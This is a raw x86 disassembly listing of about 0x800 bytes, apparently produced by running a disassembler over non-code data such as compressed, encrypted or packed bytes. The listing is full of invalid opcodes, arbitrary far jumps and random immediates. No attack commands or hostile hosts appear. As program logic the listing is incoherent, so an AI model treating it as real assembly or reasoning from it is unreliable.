  4082dc:	and    ebp,DWORD PTR [eax-0x42]
  4082df:	jmp    0x40835f
  4082e1:	and    eax,0x53e76c75
  4082e6:	mov    dh,0xbe
  4082e8:	repz mov al,ds:0x59ae01ea
  4082ee:	jmp    0xd751:0xe5b9ce7b
  4082f5:	cmp    bh,BYTE PTR [esi]
  4082f7:	jl     0x40831b
  4082f9:	ja     0x408364
  4082fb:	stos   BYTE PTR es:[edi],al
  4082fc:	dec    esi
  4082fd:	call   0x521b:0x202e1703
  408304:	and    BYTE PTR [edi-0x12],0xd8
  408308:	popa   
  408309:	leave  
  40830a:	lock test eax,0xb00a9175
  408310:	loopne 0x408369
  408312:	mov    ds:0x60cbbae6,al
  408317:	data16 loop 0x4082e0
  40831a:	retf   0x533b
  40831d:	mov    ebp,0xefafdf63
  408322:	lock in al,dx
  408324:	pop    ebp
  408325:	arpl   WORD PTR [esi+0x1],bp
  408328:	test   bh,0x1d
  40832b:	xchg   esi,eax
  40832c:	xchg   ebx,eax
  40832d:	push   es
  40832e:	jmp    0x23bc:0xb7137f61
  408335:	sub    ecx,esi
  408337:	push   ebx
  408338:	mov    dl,0x50
  40833a:	fcomp  QWORD PTR [ebx+ebx*2-0x524c633e]
  408341:	int    0x8e
  408343:	arpl   WORD PTR [esi],sp
  408345:	xchg   esi,eax
  408346:	push   ds
  408347:	loope  0x408373
  408349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40834a:	stos   DWORD PTR es:[edi],eax
  40834b:	daa    
  40834c:	lea    esi,[edi+0x63aec0f9]
  408352:	lods   eax,DWORD PTR ds:[esi]
  408353:	ins    DWORD PTR es:[edi],dx
  408354:	xlat   BYTE PTR ds:[ebx]
  408355:	rcl    DWORD PTR [edx],1
  408357:	xor    bh,dl
  408359:	xor    dl,al
  40835b:	jne    0x4082f8
  40835d:	mov    bl,dh
  40835f:	mov    edx,0xfaa9e12d
  408364:	sub    al,0x6c
  408366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408367:	pop    ebp
  408368:	rcl    DWORD PTR [esi+0x324f13f],0x3e
  40836f:	jg     0x4083bf
  408371:	add    DWORD PTR [esi-0x6b],0xcbf186c3
  408378:	cs js  0x408342
  40837b:	or     dl,ah
  40837d:	sbb    al,0x6a
  40837f:	repnz sub BYTE PTR [eax-0x7243173e],0xf9
  408387:	js     0x4083fe
  408389:	aad    0x29
  40838b:	bound  ebp,QWORD PTR [ebp-0x7b3959fb]
  408391:	shl    BYTE PTR [edi-0x14],1
  408394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408395:	adc    ecx,esi
  408397:	push   edx
  408398:	cmp    ch,BYTE PTR [ecx]
  40839a:	jl     0x4083b8
  40839c:	not    BYTE PTR [eax]
  40839e:	hlt    
  40839f:	jne    0x40839a
  4083a1:	jb     0x4083db
  4083a3:	aas    
  4083a4:	mov    eax,ds:0x2d1f34af
  4083a9:	push   ds
  4083aa:	push   eax
  4083ab:	jle    0x4083ae
  4083ad:	lea    ecx,[esi+eax*4+0x31]
  4083b1:	in     al,0x4c
  4083b3:	push   edi
  4083b4:	cli    
  4083b5:	pop    edx
  4083b6:	pop    ebp
  4083b7:	(bad)  
  4083b8:	in     eax,dx
  4083b9:	jo     0x4083c8
  4083bb:	mov    al,ds:0x7e7b8eaa
  4083c0:	jmp    0x40843a
  4083c2:	ror    DWORD PTR [ecx-0x55927c65],1
  4083c8:	shl    BYTE PTR ds:0xe3979012,cl
  4083ce:	lds    ecx,FWORD PTR [ebx-0x58]
  4083d1:	popa   
  4083d2:	div    DWORD PTR [eax]
  4083d4:	xor    BYTE PTR [ecx-0x2a],al
  4083d7:	icebp  
  4083d8:	cwde   
  4083d9:	frndint 
  4083db:	mov    esi,0x162ffca7
  4083e0:	ret    
  4083e1:	cwde   
  4083e2:	sub    eax,0xe2e8ca76
  4083e7:	pop    ebx
  4083e8:	inc    ebp
  4083e9:	xchg   edx,eax
  4083ea:	xlat   BYTE PTR ds:[ebx]
  4083eb:	lock dec edx
  4083ed:	mov    fs,WORD PTR [ebx-0x7c]
  4083f0:	loopne 0x4083eb
  4083f2:	mov    eax,ds:0x7bbeeb69
  4083f7:	retf   
  4083f8:	or     eax,0x5262b31f
  4083fd:	fst    st(7)
  4083ff:	imul   BYTE PTR [eax]
  408401:	jb     0x4083f8
  408403:	and    edx,esp
  408405:	aaa    
  408406:	pop    esi
  408407:	aad    0x73
  408409:	mov    dh,BYTE PTR [ecx+0x36697f83]
  40840f:	aam    0xbe
  408411:	aaa    
  408412:	mov    edx,0x7815878c
  408417:	pop    esp
  408418:	mov    al,0xb8
  40841a:	add    bh,ah
  40841c:	push   edx
  40841d:	scas   al,BYTE PTR es:[edi]
  40841e:	cmp    dh,BYTE PTR ds:0xc17290e1
  408424:	mov    edx,0xa0ce3b8d
  408429:	push   ebx
  40842a:	aas    
  40842b:	xor    DWORD PTR [esi+0x32293414],eax
  408431:	aaa    
  408432:	jnp    0x40842a
  408434:	hlt    
  408435:	add    al,0x48
  408437:	stc    
  408438:	inc    ecx
  408439:	(bad)  
  40843a:	hlt    
  40843b:	mov    dl,0x66
  40843d:	int3   
  40843e:	aam    0xeb
  408440:	jp     0x40848c
  408442:	in     eax,dx
  408443:	jmp    0x221:0xb09e996d
  40844a:	xchg   esp,eax
  40844b:	lock mov ebx,0x694f572d
  408451:	add    eax,0xab0164d1
  408456:	jb     0x40840f
  408458:	out    0x17,eax
  40845a:	stc    
  40845b:	repnz xchg edi,eax
  40845d:	pop    ds
  40845e:	call   0x65:0x1bf0dd78
  408465:	rcl    BYTE PTR [edx],0x46
  408468:	outs   dx,BYTE PTR ds:[esi]
  408469:	sbb    DWORD PTR [edi+eax*2+0x44],ebp
  40846d:	mov    BYTE PTR ds:0xa14a3169,bh
  408473:	enter  0xdf81,0x93
  408477:	popa   
  408478:	inc    eax
  408479:	xchg   edi,eax
  40847a:	ret    
  40847b:	inc    edx
  40847c:	mov    esi,0x28dff09
  408481:	imul   ebx,esp,0x6a
  408484:	outs   dx,BYTE PTR ds:[esi]
  408485:	ror    esp,1
  408487:	or     al,0xf
  408489:	jp     0x4084ae
  40848b:	fdivp  st(4),st
  40848d:	jb     0x408414
  40848f:	gs jl  0x4084ec
  408492:	scas   eax,DWORD PTR es:[edi]
  408493:	cld    
  408494:	mov    al,0x5
  408496:	(bad)  
  408497:	call   ecx
  408499:	jne    0x4084f7
  40849b:	cmp    eax,0x96ade7d9
  4084a0:	jmp    DWORD PTR [edx+0xd]
  4084a3:	adc    al,0xb0
  4084a5:	dec    esi
  4084a6:	cmp    ch,BYTE PTR [edi]
  4084a8:	mov    esp,0xe85fcfaa
  4084ad:	outs   dx,DWORD PTR ds:[esi]
  4084ae:	sbb    BYTE PTR [ebp-0x512f789b],0x31
  4084b5:	adc    DWORD PTR [ecx],edx
  4084b7:	dec    esi
  4084b8:	mov    ebp,0x4df9edec
  4084bd:	pop    edi
  4084be:	loopne 0x408537
  4084c0:	or     ch,BYTE PTR [ecx+0x2ae892ad]
  4084c6:	adc    al,0x4d
  4084c8:	mov    ah,dl
  4084ca:	repz adc al,0xb8
  4084cd:	push   ecx
  4084ce:	sbb    ch,dh
  4084d0:	mov    esp,0xf040c216
  4084d5:	add    DWORD PTR [edi],0x68
  4084d8:	mov    edi,0x1786517c
  4084dd:	scas   al,BYTE PTR es:[edi]
  4084de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084df:	adc    DWORD PTR [edx+0x24],ecx
  4084e2:	mov    ds:0x2e73e481,eax
  4084e7:	mov    ecx,0xa989a380
  4084ec:	inc    eax
  4084ed:	ins    BYTE PTR es:[edi],dx
  4084ee:	ret    0xcb5e
  4084f1:	and    BYTE PTR [esi],ah
  4084f3:	and    DWORD PTR [edx+0x7e],edi
  4084f6:	mov    dl,0x5f
  4084f8:	cs jle 0x408576
  4084fb:	adc    esp,ecx
  4084fd:	cmp    BYTE PTR [ebp-0x637bcfd4],bh
  408503:	add    eax,0x508c7461
  408508:	cmp    al,0xbc
  40850a:	jae    0x40855d
  40850c:	in     al,dx
  40850d:	addr16 xchg ebx,eax
  40850f:	xchg   ebx,ebp
  408511:	adc    bl,dh
  408513:	push   eax
  408514:	stos   DWORD PTR es:[edi],eax
  408515:	adc    DWORD PTR [ebp-0x77],0xe
  408519:	add    BYTE PTR [eax],bh
  40851b:	jp     0x408582
  40851d:	icebp  
  40851e:	shr    DWORD PTR [eax-0x283faf0a],0x5e
  408525:	sar    DWORD PTR [ebp-0x5913b894],0x57
  40852c:	pop    esp
  40852d:	sbb    BYTE PTR [edx],bh
  40852f:	in     eax,0x7a
  408531:	scas   eax,DWORD PTR es:[edi]
  408532:	shl    BYTE PTR [edi],0x83
  408535:	dec    esp
  408536:	push   esi
  408537:	jg     0x4084da
  408539:	jle    0x4085b5
  40853b:	mov    edi,0x897de29e
  408540:	xor    ch,al
  408542:	jmp    0xf17b:0x75f2610e
  408549:	das    
  40854a:	mov    bh,0x3d
  40854c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40854d:	push   edx
  40854e:	clc    
  40854f:	add    eax,0x156ad7d9
  408554:	(bad)  
  408555:	dec    esp
  408556:	push   ds
  408557:	push   ebx
  408558:	imul   ebp,DWORD PTR [esi+0x57],0xffffffd4
  40855c:	repz arpl WORD PTR [eax],bx
  40855f:	out    0xe5,eax
  408561:	mov    ecx,0x87679c2e
  408566:	push   cs
  408567:	jle    0x4084f9
  408569:	inc    edx
  40856a:	cwde   
  40856b:	es sti 
  40856d:	mov    ebp,0xc18f279f
  408572:	fcom   DWORD PTR [ebp+edx*2-0x77]
  408576:	mov    bh,0x4d
  408578:	into   
  408579:	sub    BYTE PTR ds:0x78e4eb40,0xc
  408580:	loop   0x4085f4
  408582:	mov    esp,0x9703e56f
  408587:	es mov ebp,0xc994a155
  40858d:	mov    dl,0xa7
  40858f:	xor    ebp,esi
  408591:	jmp    FWORD PTR [esi-0x7d]
  408594:	stc    
  408595:	jl     0x408573
  408597:	pop    ss
  408598:	retf   0xb1ff
  40859b:	and    eax,0xe2344419
  4085a0:	adc    DWORD PTR [eax+edi*4],esi
  4085a3:	xchg   edi,eax
  4085a4:	and    ebp,esi
  4085a6:	cmp    eax,0xb75ec831
  4085ab:	xor    bh,BYTE PTR [eax*4-0x50438b54]
  4085b2:	scas   eax,DWORD PTR es:[edi]
  4085b3:	loopne 0x408596
  4085b5:	push   ebp
  4085b6:	mov    edx,DWORD PTR [esi+0x7f62fad]
  4085bc:	mov    DWORD PTR [edx-0x3aed9382],edi
  4085c2:	or     edx,esi
  4085c4:	pop    edx
  4085c5:	dec    edx
  4085c6:	adc    BYTE PTR [esi],bl
  4085c8:	or     BYTE PTR [edi],ah
  4085ca:	jo     0x4085e9
  4085cc:	mov    esp,0x47610510
  4085d1:	(bad)  
  4085d2:	xchg   BYTE PTR [esi+0x42],dh
  4085d5:	inc    ebx
  4085d6:	sub    ecx,eax
  4085d8:	stc    
  4085d9:	dec    ebp
  4085da:	rcl    esi,cl
  4085dc:	inc    eax
  4085dd:	push   ecx
  4085de:	mov    edx,0x98a6909
  4085e3:	jge    0x40856b
  4085e5:	inc    eax
  4085e6:	mov    ch,0xe0
  4085e8:	ftst   
  4085ea:	sbb    al,BYTE PTR [ebp+0x7fdd2c1b]
  4085f0:	sub    eax,0x3c119463
  4085f5:	data16 and bl,BYTE PTR [edi+0x1b]
  4085f9:	jns    0x4085fa
  4085fb:	sti    
  4085fc:	jns    0x4085d1
  4085fe:	(bad)  
  4085ff:	xchg   edi,eax
  408600:	and    al,BYTE PTR [ebx]
  408602:	push   ecx
  408603:	arpl   di,bx
  408605:	add    ah,BYTE PTR [ecx+ebx*1+0x9095835]
  40860c:	mov    bl,0xf4
  40860e:	xlat   BYTE PTR ds:[ebx]
  40860f:	mov    ebx,0x770d22a9
  408614:	pop    es
  408615:	jp     0x40865b
  408617:	call   0x60f0:0xd76ab1e5
  40861e:	mov    ecx,0xb627c6e0
  408623:	aad    0x6b
  408625:	lea    esi,[edx-0x6d2cb7aa]
  40862b:	sub    bl,BYTE PTR [ebx-0x66]
  40862e:	sbb    edx,DWORD PTR ds:[ecx+0x51345e64]
  408635:	jle    0x408627
  408637:	iret   
  408638:	xor    esp,ecx
  40863a:	add    DWORD PTR [eax+edi*2-0x31d6ab40],edx
  408641:	bound  esp,QWORD PTR [edx+0x7c]
  408644:	not    BYTE PTR [eax+0x5b089e39]
  40864a:	inc    edi
  40864b:	(bad)  
  40864c:	lahf   
  40864d:	sub    dh,dh
  40864f:	(bad)  
  408650:	sub    eax,DWORD PTR [eax+0x142c5421]
  408656:	adc    eax,0xd9716e6e
  40865b:	mov    eax,0x245a596b
  408660:	test   DWORD PTR [edi+0x50],ecx
  408663:	push   es
  408664:	test   DWORD PTR [ebx],esi
  408666:	jns    0x408690
  408668:	cmc    
  408669:	dec    esp
  40866a:	sti    
  40866b:	scas   al,BYTE PTR es:[edi]
  40866c:	dec    esp
  40866d:	mov    bl,0xe5
  40866f:	sbb    BYTE PTR [edx-0x742034f7],ch
  408675:	mov    ah,0xd
  408677:	call   0x4c8d:0x466b5237
  40867e:	out    dx,al
  40867f:	adc    eax,0x59234037
  408684:	sub    al,0x2c
  408686:	popf   
  408687:	dec    esi
  408688:	xchg   ebx,eax
  408689:	push   esp
  40868a:	lods   al,BYTE PTR ds:[esi]
  40868b:	sub    BYTE PTR [edx+0x517429c],ah
  408691:	pop    esi
  408692:	ror    ch,0x32
  408695:	jns    0x40866f
  408697:	sub    BYTE PTR [eax-0x641b8cba],dl
  40869d:	mov    esp,0x29830986
  4086a2:	sbb    al,0xd1
  4086a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086a5:	je     0x408670
  4086a7:	aad    0xe0
  4086a9:	mov    ebp,0x53f02d12
  4086ae:	or     bh,dh
  4086b0:	pop    DWORD PTR [ebx]
  4086b2:	dec    ebx
  4086b3:	push   ebp
  4086b4:	adc    al,BYTE PTR ds:0xf873b4f0
  4086ba:	(bad)  
  4086bb:	cli    
  4086bc:	loopne 0x4086e3
  4086be:	add    DWORD PTR [esi+0x32612447],0x2b4b2471
  4086c8:	jp     0x408708
  4086ca:	pop    esp
  4086cb:	mov    bl,0xe5
  4086cd:	push   ecx
  4086ce:	sbb    esp,DWORD PTR [ebp+ecx*2+0x56]
  4086d2:	and    BYTE PTR [ebx-0x83f3e8e],0xff
  4086d9:	mov    cl,0xe9
  4086db:	pop    edx
  4086dc:	pop    ebp
  4086dd:	jg     0x4086b0
  4086df:	out    0x37,al
  4086e1:	push   ebx
  4086e2:	and    al,0xc3
  4086e4:	and    ebx,DWORD PTR [ebx-0x40759f4c]
  4086ea:	rcl    DWORD PTR [edi-0x7c96ddb7],1
  4086f0:	bound  edx,QWORD PTR [ebx]
  4086f2:	xor    al,0x50
  4086f4:	sub    BYTE PTR [edi+ebx*8],dl
  4086f7:	std    
  4086f8:	enter  0xcd6a,0xd3
  4086fc:	shl    DWORD PTR ds:0x67701b37,cl
  408702:	cmp    DWORD PTR gs:[eax+edx*8+0x5d],edi
  408707:	and    al,0x44
  408709:	jne    0x408721
  40870b:	fild   DWORD PTR [ecx-0x60]
  40870e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40870f:	sbb    DWORD PTR [eax],ebx
  408711:	shl    DWORD PTR [edi+edx*2],0x7f
  408715:	mov    ds:0x45bd3933,al
  40871a:	pop    edx
  40871b:	push   0x1
  40871d:	fcom   st(6)
  40871f:	jmp    0x3f84:0xd992200f
  408726:	add    ah,BYTE PTR [ebx+0x4b]
  408729:	nop
  40872a:	pop    ds
  40872b:	div    DWORD PTR [edx+0x7ab51276]
  408731:	or     edi,DWORD PTR [edx+0x5b0a7c3f]
  408737:	pop    edx
  408738:	push   0xffffffe5
  40873a:	pop    ds
  40873b:	push   esi
  40873c:	cdq    
  40873d:	hlt    
  40873e:	aad    0x19
  408740:	rcr    BYTE PTR [ebx+0x7c34ee],cl
  408746:	in     al,0xcc
  408748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408749:	mov    cl,0x9
  40874b:	cmp    eax,0x6f5deb65
  408750:	push   ecx
  408751:	inc    edx
  408752:	push   esp
  408753:	mov    ebx,0xfb14452a
  408758:	mov    cs:0xc74ff705,eax
  40875e:	pushf  
  40875f:	or     eax,0x4c8a9fbc
  408764:	push   edx
  408765:	jns    0x4087d5
  408767:	ins    DWORD PTR es:[edi],dx
  408768:	xchg   ebx,eax
  408769:	or     ebx,DWORD PTR [ecx]
  40876b:	int3   
  40876c:	sbb    DWORD PTR [edi],eax
  40876e:	pusha  
  40876f:	hlt    
  408770:	sbb    eax,esi
  408772:	call   0x1ea09ff1
  408777:	xchg   DWORD PTR [edi],ecx
  408779:	lods   al,BYTE PTR ds:[esi]
  40877a:	mov    ss,WORD PTR [ebp+0x70]
  40877d:	mov    ds:0x2065d03e,al
  408782:	pop    esi
  408783:	inc    esi
  408784:	jnp    0x40879f
  408786:	bound  ebp,QWORD PTR [ebx+0x31f54d7f]
  40878c:	fnsave [ecx+ecx*8-0x6f0b4afd]
  408793:	ja     0x408809
  408795:	or     al,BYTE PTR [esi+0x5eec1580]
  40879b:	and    eax,DWORD PTR [esi-0x6d329575]
  4087a1:	rol    bh,1
  4087a3:	push   edi
  4087a4:	cmp    ecx,edx
  4087a6:	outs   dx,DWORD PTR ds:[esi]
  4087a7:	(bad)  
  4087a8:	iret   
  4087a9:	pop    ebp
  4087aa:	jle    0x4087dc
  4087ac:	add    BYTE PTR [eax-0x6c],ah
  4087af:	iret   
  4087b0:	mov    ds:0x818b18fd,al
  4087b5:	sub    eax,ebp
  4087b7:	sbb    bl,BYTE PTR [eax-0x15]
  4087ba:	xchg   ebx,eax
  4087bb:	pop    ecx
  4087bc:	pusha  
  4087bd:	loope  0x408741
  4087bf:	clc    
  4087c0:	mov    al,BYTE PTR [edx-0x7f2943af]
  4087c6:	out    0x8d,al
  4087c8:	adc    eax,0x272eef17
  4087cd:	inc    eax
  4087ce:	pop    esi
  4087cf:	outs   dx,BYTE PTR ds:[esi]
  4087d0:	dec    esi
  4087d1:	adc    ebp,DWORD PTR [eax]
  4087d3:	or     al,BYTE PTR [ecx]
  4087d5:	lds    eax,FWORD PTR ds:0xa0d892cc
  4087db:	div    BYTE PTR [esi+esi*8-0x733326e6]
  4087e2:	inc    ecx
  4087e3:	idiv   DWORD PTR [edi]
  4087e5:	adc    al,dl
  4087e7:	and    eax,DWORD PTR [edi]
  4087e9:	xchg   edx,eax
  4087ea:	enter  0x19d3,0x3
  4087ee:	xor    BYTE PTR [eax+0x5dc59177],ah
  4087f4:	push   cs
  4087f5:	dec    edi
  4087f6:	div    DWORD PTR [ebx-0x4ef011f3]
  4087fc:	cmp    DWORD PTR [ecx+edi*2+0x3f1d7f72],ecx
  408803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408804:	push   ss
  408805:	push   ds
  408806:	push   edx
  408807:	stos   DWORD PTR es:[di],eax
  408809:	pop    ecx
  40880a:	adc    eax,0x176cbb47
  40880f:	cmp    BYTE PTR [ebp+0x10],al
  408812:	inc    eax
  408813:	and    DWORD PTR [esp+ebp*8],esi
  408816:	inc    dl
  408818:	cld    
  408819:	test   DWORD PTR [edx+0x11658910],0x6d2bd69e
  408823:	(bad)  
  408824:	mov    bl,0xe2
  408826:	shr    BYTE PTR [esi+0x45],0xd1
  40882a:	or     DWORD PTR [edx],ebx
  40882c:	ins    BYTE PTR es:[edi],dx
  40882d:	add    edx,DWORD PTR [edx-0x27]
  408830:	inc    esi
  408831:	xor    DWORD PTR [edx+0x4c],esp
  408834:	jae    0x40880d
  408836:	scas   al,BYTE PTR es:[edi]
  408837:	lods   al,BYTE PTR ds:[esi]
  408838:	bound  ecx,QWORD PTR [edi+0x30]
  40883b:	xchg   ebx,ebp
  40883d:	fild   QWORD PTR [esi]
  40883f:	shl    DWORD PTR [ebp+0x1199c398],1
  408845:	int    0x94
  408847:	je     0x408833
  408849:	push   esp
  40884a:	pop    eax
  40884b:	out    dx,al
  40884c:	push   ebp
  40884d:	out    0x5d,al
  40884f:	mov    ds:0x927d80ea,eax
  408854:	sub    eax,0x12c2d748
  408859:	add    eax,0x43dc48d4
  40885e:	push   edi
  40885f:	in     al,dx
  408860:	shl    DWORD PTR [eax],1
  408862:	add    DWORD PTR [ecx-0x48ac70b1],edi
  408868:	jae    0x4087fe
  40886a:	or     bl,BYTE PTR [bp+0x7c45]
  40886f:	pop    edx
  408870:	sub    ah,BYTE PTR [edx]
  408872:	shr    DWORD PTR ds:0x41341fe8,0xff
  408879:	addr16 adc eax,0xc7b75b7d
  40887f:	mov    dl,0x93
  408881:	sar    DWORD PTR [ebx+0x47bc0f02],0x4e
  408888:	test   al,0x3a
  40888a:	jecxz  0x408828
  40888c:	mov    ds:0x2b94457b,al
  408891:	xchg   ebp,eax
  408892:	cmovs  esi,DWORD PTR [ecx-0x411a30f1]
  408899:	dec    edx
  40889a:	jle    0x408906
  40889c:	sub    esi,DWORD PTR [edi]
  40889e:	mov    al,ds:0xb10b6019
  4088a3:	call   0x1e0f:0xaff7179f
  4088aa:	mov    ebp,DWORD PTR [esi+ebp*2-0xc]
  4088ae:	mov    al,0x81
  4088b0:	dec    eax
  4088b1:	cmp    ch,BYTE PTR [ebx-0x1c]
  4088b4:	add    bh,BYTE PTR [edx+0x6d]
  4088b7:	inc    esp
  4088b8:	ja     0x4088a5
  4088ba:	sahf   
  4088bb:	mov    cl,0x54
  4088bd:	jmp    0x4088f2
  4088bf:	xor    al,0xa0
  4088c1:	add    eax,0x1a8edd7a
  4088c6:	test   BYTE PTR [edi-0xe],0xf7
  4088ca:	sbb    ecx,DWORD PTR fs:[edi]
  4088cd:	cmp    al,0x37
  4088cf:	inc    edi
  4088d0:	xor    esp,DWORD PTR [edx-0x6d]
  4088d3:	adc    al,0x31
  4088d5:	aad    0xcc
  4088d7:	sbb    ah,cl
  4088d9:	pop    esp
  4088da:	add    esi,DWORD PTR [esi+edx*8-0x28]
  4088de:	retf   0xdf4d
  4088e1:	sbb    dl,BYTE PTR [ebp-0x34e2ac50]
  4088e7:	and    bh,BYTE PTR ds:0xbbc5a340
  4088ed:	gs retf 0xbbdc
  4088f1:	inc    edx
  4088f2:	je     0x4088ab
  4088f4:	imul   ecx,DWORD PTR [esi],0xffffffcb
  4088f7:	jg     0x408947
  4088f9:	ins    BYTE PTR es:[edi],dx
  4088fa:	mov    al,ds:0xc8e0d855
  4088ff:	mov    ecx,0xde003bad
  408904:	leave  
  408905:	dec    eax
  408906:	jmp    0x408948
  408908:	or     al,0x71
  40890a:	sub    BYTE PTR [eax],cl
  40890c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40890d:	mov    eax,ds:0xecd7c629
  408912:	mov    ds:0x9cd630c9,eax
  408917:	adc    al,0xf1
  408919:	sti    
  40891a:	repz icebp 
  40891c:	add    ch,BYTE PTR [ecx+ecx*8-0x3f07ed80]
  408923:	mov    ah,0x9d
  408925:	inc    edi
  408926:	mov    dh,0x4a
  408928:	stos   DWORD PTR es:[edi],eax
  408929:	mov    WORD PTR [ebx+esi*8-0x12b2934c],fs
  408930:	js     0x4088f6
  408932:	dec    eax
  408933:	dec    esp
  408934:	mov    bh,0xb
  408936:	push   es
  408937:	inc    ecx
  408938:	push   edx
  408939:	(bad)  
  40893a:	xor    ebx,DWORD PTR [edi-0x50]
  40893d:	xor    ch,cl
  40893f:	call   0xdb51:0x9432952d
  408946:	xor    al,0xd0
  408948:	inc    ecx
  408949:	dec    edx
  40894a:	pop    ecx
  40894b:	out    dx,al
  40894c:	aam    0xcf
  40894e:	mov    edi,ebx
  408950:	stos   BYTE PTR es:[edi],al
  408951:	arpl   WORD PTR [esi-0x75090467],cx
  408957:	xchg   edx,eax
  408958:	sar    bl,1
  40895a:	daa    
  40895b:	inc    eax
  40895c:	mov    DWORD PTR [eax-0x40ec2ed7],esp
  408962:	ins    DWORD PTR es:[edi],dx
  408963:	cli    
  408964:	pushf  
  408965:	enter  0xd28a,0x2
  408969:	clc    
  40896a:	test   eax,0x6b302bca
  40896f:	add    ecx,DWORD PTR [ebp-0x6246b1c0]
  408975:	ins    BYTE PTR es:[edi],dx
  408976:	mov    ecx,0xe71623db
  40897b:	fsubp  st(1),st
  40897d:	xchg   esi,eax
  40897e:	out    0x30,eax
  408980:	rol    edi,cl
  408982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408983:	dec    edi
  408984:	unpckhps xmm6,XMMWORD PTR [ebp+0x1156bdc6]
  40898b:	dec    esp
  40898c:	sub    al,0x8a
  40898e:	pushf  
  40898f:	je     0x40892b
  408991:	sub    dl,BYTE PTR [ebx+0x39]
  408994:	leave  
  408995:	lahf   
  408996:	pop    esi
  408997:	jge    0x4089ee
  408999:	xor    eax,0xd2c38cac
  40899e:	outs   dx,DWORD PTR ds:[esi]
  40899f:	(bad)  
  4089a1:	mov    ds:0xbd0ea035,eax
  4089a6:	jb     0x40895c
  4089a8:	sbb    eax,0xbc21aab2
  4089ad:	dec    ecx
  4089ae:	xor    ah,ah
  4089b0:	outs   dx,BYTE PTR ds:[esi]
  4089b1:	imul   edx,DWORD PTR [eax+0x1c9a1a4c],0xffffff8b
  4089b8:	mov    al,0x1b
  4089ba:	xor    BYTE PTR [eax+0x64],bh
  4089bd:	mov    al,ds:0xda5fb354
  4089c2:	xor    ebp,DWORD PTR [edi-0x63b16eb1]
  4089c8:	neg    cl
  4089ca:	in     eax,dx
  4089cb:	ja     0x408992
  4089cd:	add    edi,DWORD PTR [ecx-0x3a]
  4089d0:	xchg   esi,eax
  4089d1:	inc    edi
  4089d2:	gs je  0x4089e5
  4089d5:	adc    al,0x10
  4089d7:	bound  esi,QWORD PTR [eax]
  4089d9:	inc    ebx
  4089da:	or     esi,DWORD PTR [ecx-0x7c78c98d]
  4089e0:	scas   al,BYTE PTR es:[edi]
  4089e1:	jo     0x4089ac
  4089e3:	push   0x93eba52a
  4089e8:	icebp  
  4089e9:	test   bl,al
  4089eb:	add    DWORD PTR [ebp-0x7b],0x4a
  4089ef:	cdq    
  4089f0:	xchg   edx,eax
  4089f1:	data16 xor al,0xc2
  4089f4:	sub    eax,esi
  4089f6:	jmp    0x408a1e
  4089f8:	shl    BYTE PTR [esi],1
  4089fa:	mov    BYTE PTR [eax+0x7],dh
  4089fd:	into   
  4089fe:	mov    ah,0xe9
  408a00:	outs   dx,DWORD PTR ds:[esi]
  408a01:	inc    ebp
  408a02:	pop    eax
  408a03:	jmp    0xb036397
  408a08:	push   ebx
  408a09:	arpl   WORD PTR ds:0xe791ed5a,cx
  408a0f:	int    0x76
  408a11:	bound  ecx,QWORD PTR [eax]
  408a13:	retf   0x7e14
  408a16:	cmp    al,0x7d
  408a18:	imul   DWORD PTR [edx+0x6a469279]
  408a1e:	pop    ebx
  408a1f:	mov    eax,ds:0x15103e4f
  408a24:	jmp    0x4089b8
  408a26:	lds    edi,FWORD PTR [ebx-0x710337a3]
  408a2c:	in     eax,dx
  408a2d:	cmp    eax,0x1416d35
  408a32:	cld    
  408a33:	pop    ebp
  408a34:	xchg   edi,eax
  408a35:	imul   ebp,DWORD PTR [edi+ebx*2-0x77e4dc76],0xfffffff2
  408a3d:	cwde   
  408a3e:	sbb    edi,DWORD PTR [eax]
  408a40:	xor    al,ch
  408a42:	(bad)  
  408a43:	(bad)  
  408a44:	sub    eax,0x146ffbdd
  408a49:	mov    edi,0xf5c08d46
  408a4e:	xlat   BYTE PTR ds:[ebx]
  408a4f:	jle    0x408abb
  408a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a52:	dec    esp
  408a53:	(bad)  
  408a54:	daa    
  408a55:	jnp    0x408aad
  408a57:	inc    edi
  408a58:	loope  0x408aa9
  408a5a:	gs sbb BYTE PTR fs:[edi+ecx*4+0x39],bl
  408a60:	ret    
  408a61:	jmp    0x408a60
  408a63:	xchg   edi,eax
  408a64:	mov    ecx,0x87d3e82
  408a69:	lds    esp,FWORD PTR [eax]
  408a6b:	cmp    al,0x66
  408a6d:	mov    esi,0x9f51c900
  408a72:	es aad 0xd1
  408a75:	int3   
  408a76:	xchg   ebp,eax
  408a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a78:	pop    esi
  408a79:	leave  
  408a7a:	xchg   esi,eax
  408a7b:	lahf   
  408a7c:	pop    esp
  408a7d:	add    eax,0xc0daa771
  408a82:	xchg   edx,eax
  408a83:	(bad)  
  408a84:	test   BYTE PTR [edi+0x419d3ca8],cl
  408a8a:	push   ebx
  408a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a8c:	retf   0x7b2c
  408a8f:	fsincos 
  408a91:	fadd   DWORD PTR [eax-0x42]
  408a94:	lahf   
  408a95:	pop    ebp
  408a96:	mov    edx,0x6d935e0e
  408a9b:	repnz push edi
  408a9d:	push   edx
  408a9e:	pop    ebp
  408a9f:	ins    BYTE PTR es:[edi],dx
  408aa0:	cmp    cl,BYTE PTR [esi-0x5]
  408aa3:	stos   BYTE PTR es:[edi],al
  408aa4:	test   eax,0xe8be6a5f
  408aa9:	out    0x4f,eax
  408aab:	je     0x408a54
  408aad:	jp     0x408ac4
  408aaf:	jno    0x408a46
  408ab1:	or     DWORD PTR [edx-0x7fe0591],0xa5842525
  408abb:	iret   
  408abc:	dec    edx
  408abd:	dec    ebx
  408abe:	sbb    DWORD PTR ds:0x44b8fb1a,esp
  408ac4:	jo     0x408b2a
  408ac6:	scas   al,BYTE PTR es:[edi]
  408ac7:	lea    esi,[esi+eax*4+0x15cd1222]
